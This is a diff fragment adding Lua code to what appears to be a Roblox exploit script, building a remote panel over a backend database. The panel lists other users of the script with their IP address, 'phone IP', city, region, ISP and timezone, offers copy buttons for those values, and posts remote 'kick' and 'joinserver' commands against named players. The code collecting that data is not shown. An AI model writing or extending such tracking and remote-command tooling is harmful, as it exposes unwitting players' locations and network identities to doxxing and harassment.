+            Instance.new("UICorner", iClose).CornerRadius = UDim.new(0, 6)
+            iClose.MouseButton1Click:Connect(function() infoSg:Destroy() end)
+
+            local list = Instance.new("ScrollingFrame", iFrame)
+            list.Size = UDim2.new(1, -16, 1, -46)
+            list.Position = UDim2.new(0, 8, 0, 40)
+            list.BackgroundTransparency = 1
+            list.BorderSizePixel = 0
+            list.ScrollBarThickness = 4
+            list.ScrollBarImageColor3 = Color3.new(1, 1, 1)
+            list.CanvasSize = UDim2.new(0, 0, 0, 0)
+            local ll = Instance.new("UIListLayout", list)
+            ll.Padding = UDim.new(0, 4)
+            ll.SortOrder = Enum.SortOrder.LayoutOrder
+            ll:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+                list.CanvasSize = UDim2.new(0, 0, 0, ll.AbsoluteContentSize.Y + 8)
+            end)
+
+            local function addRow(label, value)
+                local row = Instance.new("Frame", list)
+                row.Size = UDim2.new(1, -4, 0, 28)
+                row.BackgroundTransparency = 1
+                local l = Instance.new("TextLabel", row)
+                l.Size = UDim2.new(0.6, 0, 1, 0)
+                l.Position = UDim2.new(0, 4, 0, 0)
+                l.BackgroundTransparency = 1
+                l.Text = value
+                l.TextColor3 = Color3.new(1, 1, 1)
+                l.Font = Enum.Font.Code
+                l.TextSize = 12
+                l.TextXAlignment = Enum.TextXAlignment.Right
+                l.TextTruncate = Enum.TextTruncate.AtEnd
+                local lb = Instance.new("TextLabel", row)
+                lb.Size = UDim2.new(0.35, 0, 1, 0)
+                lb.Position = UDim2.new(0.65, 0, 0, 0)
+                lb.BackgroundTransparency = 1
+                lb.Text = label .. ":"
+                lb.TextColor3 = Color3.fromRGB(200, 200, 200)
+                lb.Font = Enum.Font.Code
+                lb.TextSize = 12
+                lb.TextXAlignment = Enum.TextXAlignment.Left
+                local cp = Instance.new("TextButton", row)
+                cp.Size = UDim2.new(0, 22, 0, 20)
+                cp.Position = UDim2.new(1, -24, 0, 4)
+                cp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+                cp.Text = "📋"
+                cp.TextSize = 10
+                cp.TextColor3 = Color3.new(1, 1, 1)
+                Instance.new("UICorner", cp).CornerRadius = UDim.new(0, 4)
+                cp.MouseButton1Click:Connect(function()
+                    if setclipboard then pcall(function() setclipboard(tostring(value)) end) end
+                end)
+            end
+
+            addRow("الاسم المستعار", tostring(playerData.displayName or ""))
+            addRow("الاسم الأساسي", tostring(playerData.username or ""))
+            addRow("الدولة", tostring(playerData.country or "Unknown"))
+            addRow("المدينة", tostring(playerData.city or "-"))
+            addRow("المنطقة", tostring(playerData.region or "-"))
+            addRow("ISP", tostring(playerData.isp or "-"))
+            addRow("IP الجهاز", tostring(playerData.ip or "N/A"))
+            addRow("IP الهاتف", tostring(playerData.phoneIp or "N/A"))
+            addRow("المنطقة الزمنية", tostring(playerData.timezone or "UTC"))
+            addRow("عمر الحساب", tostring(playerData.accountAgeDays or 0) .. " يوم")
+            addRow("الحالة", tostring(playerData.status or "unknown"))
+            addRow("Place ID", tostring(playerData.placeId or 0))
+            addRow("Job ID", tostring(playerData.jobId or "-"))
+        end)
+
+        mkBtn("Join", 55, function()
+            local link = "roblox://placeId=" .. tostring(playerData.placeId or 0) .. "&gameInstanceId=" .. tostring(playerData.jobId or "")
+            if setclipboard then pcall(function() setclipboard(link) end) end
+        end)
+
+        mkBtn("JoinMe", 60, function()
+            SendCommandAPI("notf", playerData.username, "")
+            task.spawn(function()
+                local data = {
+                    cmd = "joinserver",
+                    target = playerData.username,
+                    value = tostring(game.JobId or ""),
+                    sender = LocalPlayer.Name,
+                    timestamp = os.time(),
+                    status = "pending",
+                }
+                HttpCall("POST", "commands.json", data)
+            end)
+        end)
+
+        mkBtn("X", 30, function()
+            if playerData.username == LocalPlayer.Name then return end
+            local cmdData = {
+                cmd = "kick",
+                target = playerData.username,
+                value = "",
+                sender = LocalPlayer.Name,
+                timestamp = os.time(),
+                status = "pending",
+            }
+            task.spawn(function()
+                HttpCall("POST", "commands.json", cmdData)
+            end)
+        end)
+
+        task.spawn(function()
+            while card and card.Parent do
+                updateTime()
+                task.wait(60)
+            end
+        end)
+    end
+
+    local function RefreshPlayersTab(scroll)
+        for _, c in ipairs(scroll:GetChildren()) do
+            if c:IsA("Frame") then c:Destroy() end
+        end
+        local ok, data = HttpCall("GET", "players.json")
+        if not ok or type(data) ~= "table" then return end
+        local now = os.time()
+        local list = {}
+        for username, pdata in pairs(data) do
+            if type(pdata) == "table" then
+                pdata.username = username
+                local ls = tonumber(pdata.lastSeen) or 0
+                local isOnline = (now - ls) <= OFFLINE_THRESHOLD
+                pdata.status = isOnline and "online" or "offline"
+                if (now - ls) > OFFLINE_EXPIRY then
+                    task.spawn(function()
+                        HttpCall("DELETE", "players/" .. username .. ".json", nil)
+                    end)
+                else
+                    table.insert(list, pdata)
+                end
+            end
+        end
+        table.sort(list, function(a, b)
+            if a.status ~= b.status then return a.status == "online" end
+            return (a.username or "") < (b.username or "")
+        end)
+        for _, pdata in ipairs(list) do
+            CreatePlayerCardUI(scroll, pdata, false)
+        end
+    end
+
+    if ConnectedPlayersTab then
+        local ConnHeader = Instance.new("Frame")
+        ConnHeader.Size = UDim2.new(1, 0, 0, 35)
+        ConnHeader.BackgroundTransparency = 1
+        ConnHeader.Parent = ConnectedPlayersTab
+        local searchBox = Instance.new("TextBox")
+        searchBox.Size = UDim2.new(0.95, 0, 0, 28)
+        searchBox.Position = UDim2.new(0.025, 0, 0, 4)
+        searchBox.BackgroundColor3 = Color3.fromRGB(40, 30, 55)
+        searchBox.BorderSizePixel = 0
+        searchBox.PlaceholderText = "ابحث بالاسم الأساسي أو المستعار..."
+        searchBox.Text = ""
+        searchBox.TextColor3 = Color3.fromRGB(220, 200, 255)
+        searchBox.PlaceholderColor3 = Color3.fromRGB(200, 170, 255)
+        searchBox.Font = Enum.Font.GothamMedium
+        searchBox.TextSize = 13
+        searchBox.ClearTextOnFocus = false
+        searchBox.Parent = ConnHeader
+        Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 6)
+
+        local ConnScroll = Instance.new("ScrollingFrame")
+        ConnScroll.Size = UDim2.new(1, 0, 1, -40)
+        ConnScroll.Position = UDim2.new(0, 0, 0, 40)
+        ConnScroll.BackgroundTransparency = 1
+        ConnScroll.ScrollBarThickness = 6
+        ConnScroll.ScrollBarImageColor3 = PURPLE
+        ConnScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+        ConnScroll.Parent = ConnectedPlayersTab
+        local ConnLayout = Instance.new("UIListLayout", ConnScroll)
+        ConnLayout.Padding = UDim.new(0, 8)
+        ConnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+        ConnLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        ConnLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+            ConnScroll.CanvasSize = UDim2.new(0, 0, 0, ConnLayout.AbsoluteContentSize.Y + 10)
+        end)
+        task.spawn(function()
+            while ConnScroll and ConnScroll.Parent do
+                pcall(function() RefreshPlayersTab(ConnScroll) end)
+                task.wait(10)
+            end
+        end)
+    end
+
+    if ServerPlayersTab then
+        local SrvHeader = Instance.new("Frame")
+        SrvHeader.Size = UDim2.new(1, 0, 0, 35)
+        SrvHeader.BackgroundTransparency = 1
+        SrvHeader.Parent = ServerPlayersTab
+        local srvLabel = Instance.new("TextLabel")
+        srvLabel.Size = UDim2.new(1, 0, 1, 0)
+        srvLabel.BackgroundTransparency = 1
+        srvLabel.Text = "متصلين بالسيرفر"
+        srvLabel.TextColor3 = Color3.new(1, 1, 1)
+        srvLabel.Font = Enum.Font.GothamBold
+        srvLabel.TextSize = 14
+        srvLabel.Parent = SrvHeader
+
+        local SrvScroll = Instance.new("ScrollingFrame")
+        SrvScroll.Size = UDim2.new(1, 0, 1, -40)
+        SrvScroll.Position = UDim2.new(0, 0, 0, 40)
+        SrvScroll.BackgroundTransparency = 1
+        SrvScroll.ScrollBarThickness = 6
+        SrvScroll.ScrollBarImageColor3 = PURPLE
+        SrvScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+        SrvScroll.Parent = ServerPlayersTab
+        local SrvLayout = Instance.new("UIListLayout", SrvScroll)
+        SrvLayout.Padding = UDim.new(0, 8)
+        SrvLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+        SrvLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        SrvLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+            SrvScroll.CanvasSize = UDim2.new(0, 0, 0, SrvLayout.AbsoluteContentSize.Y + 10)
+        end)
+
+        task.spawn(function()
+            while SrvScroll and SrvScroll.Parent do
+                for _, c in ipairs(SrvScroll:GetChildren()) do
+                    if c:IsA("Frame") then c:Destroy() end
+                end
+                for _, plr in ipairs(Players:GetPlayers()) do
+                    local pdata = {
+                        username = plr.Name,
+                        displayName = plr.DisplayName,
+                        accountAgeDays = plr.AccountAge,
+                        country = "-",
+                        city = "-",
+                        ip = "-",
+                        phoneIp = "-",
+                        utcOffset = 0,
+                        timezone = "UTC",
+                        placeId = game.PlaceId,
+                        jobId = game.JobId or "",
+                        status = "online",
+                    }
+                    CreatePlayerCardUI(SrvScroll, pdata, true)
+                end
+                task.wait(10)
+            end
+        end)
+    end
+
+    local chatNotifs = {}
+    local chatNotifHolder
+    if CoreGui:FindFirstChild("ZenixChatNotifs") then
+        CoreGui.ZenixChatNotifs:Destroy()
+    end
+    local chatSg = Instance.new("ScreenGui")
+    chatSg.Name = "ZenixChatNotifs"
+    chatSg.ResetOnSpawn = false
+    chatSg.IgnoreGuiInset = true
+    chatSg.DisplayOrder = 999999
+    local cok = pcall(function() chatSg.Parent = CoreGui end)
+    if not cok then chatSg.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+    chatNotifHolder = Instance.new("Frame", chatSg)
+    chatNotifHolder.Size = UDim2.new(0, 320, 1, 0)
+    chatNotifHolder.Position = UDim2.new(1, -330, 0, 10)
+    chatNotifHolder.BackgroundTransparency = 1
+    local chLayout = Instance.new("UIListLayout", chatNotifHolder)
+    chLayout.Padding = UDim.new(0, 6)
+    chLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    local function RenumberChatNotifs()
+        local ordered = {}
+        for _, n in ipairs(chatNotifs) do
+            if n.Frame and n.Frame.Parent then table.insert(ordered, n) end
+        end
+        chatNotifs = ordered
+        for i, n in ipairs(chatNotifs) do
+            if n.NumLabel then n.NumLabel.Text = "#" .. i end
+        end
+    end
+
+    local function AddChatNotif(fromDisplay, message)
+        local notif = Instance.new("Frame")
+        notif.Size = UDim2.new(1, 0, 0, 90)
+        notif.BackgroundColor3 = Color3.new(0, 0, 0)
+        notif.BorderSizePixel = 0
+        notif.Active = true
+        notif.Draggable = true
+        notif.Parent = chatNotifHolder
+        Instance.new("UICorner", notif).CornerRadius = UDim.new(0, 10)
+        local st = Instance.new("UIStroke", notif)
+        st.Color = Color3.new(1, 1, 1)
+        st.Thickness = 1.5
+
+        local numLbl = Instance.new("TextLabel", notif)
+        numLbl.Size = UDim2.new(0, 30, 0, 18)
+        numLbl.Position = UDim2.new(0, 6, 0, 4)
+        numLbl.BackgroundTransparency = 1
+        numLbl.Text = "#1"
+        numLbl.TextColor3 = Color3.new(1, 1, 1)
+        numLbl.Font = Enum.Font.GothamBold
+        numLbl.TextSize = 12
+        numLbl.TextXAlignment = Enum.TextXAlignment.Right
+
+        local fromLbl = Instance.new("TextLabel", notif)
+        fromLbl.Size = UDim2.new(1, -60, 0, 18)
+        fromLbl.Position = UDim2.new(0, 40, 0, 4)
+        fromLbl.BackgroundTransparency = 1
+        fromLbl.Text = "من: " .. tostring(fromDisplay)
+        fromLbl.TextColor3 = Color3.new(1, 1, 1)
+        fromLbl.Font = Enum.Font.GothamBold
+        fromLbl.TextSize = 12
+        fromLbl.TextXAlignment = Enum.TextXAlignment.Right
+
+        local xBtn = Instance.new("TextButton", notif)
+        xBtn.Size = UDim2.new(0, 22, 0, 22)
+        xBtn.Position = UDim2.new(1, -28, 0, 4)
+        xBtn.BackgroundColor3 = Color3.new(0, 0, 0)
+        xBtn.Text = "X"
+        xBtn.TextColor3 = Color3.new(1, 1, 1)
+        xBtn.Font = Enum.Font.GothamBold
+        xBtn.TextSize = 12
+        Instance.new("UICorner", xBtn).CornerRadius = UDim.new(0, 5)
+
+        local msgLbl = Instance.new("TextLabel", notif)
+        msgLbl.Size = UDim2.new(1, -16, 0, 58)
+        msgLbl.Position = UDim2.new(0, 8, 0, 26)
+        msgLbl.BackgroundTransparency = 1
+        msgLbl.Text = tostring(message)
+        msgLbl.TextColor3 = Color3.new(1, 1, 1)
+        msgLbl.Font = Enum.Font.Gotham
+        msgLbl.TextSize = 12
+        msgLbl.TextWrapped = true
+        msgLbl.TextYAlignment = Enum.TextYAlignment.Top
+        msgLbl.TextXAlignment = Enum.TextXAlignment.Right
+
+        local entry = { Frame = notif, NumLabel = numLbl }
+        table.insert(chatNotifs, entry)
+        RenumberChatNotifs()
+
+        xBtn.MouseButton1Click:Connect(function()
+            notif:Destroy()
+            task.wait(0.05)
+            local newList = {}
+            for _, n in ipairs(chatNotifs) do
+                if n.Frame and n.Frame.Parent then table.insert(newList, n) end
+            end
+            chatNotifs = newList
+            RenumberChatNotifs()
+        end)
+    end
+
+    local seenChatMsgs = {}
+    task.spawn(function()
+        task.wait(3)
+        while chatSg and chatSg.Parent do
+            local ok, data = HttpCall("GET", "chatMessages.json")
+            if ok and type(data) == "table" then
+                for key, msg in pairs(data) do
+                    if type(msg) == "table" and not seenChatMsgs[key] then
+                        local toDev = tostring(msg.toDeveloper or "")
+                        if toDev == "" or toDev == LocalPlayer.Name then
+                            seenChatMsgs[key] = true
+                            AddChatNotif(msg.fromDisplayName or msg.fromUsername, msg.message)
+                        end
+                    end
+                end
+            end
+            task.wait(3)
+        end
+    end)
 
     ScreenGui.Destroying:Connect(function()
         for _, p in ipairs(Players:GetPlayers()) do
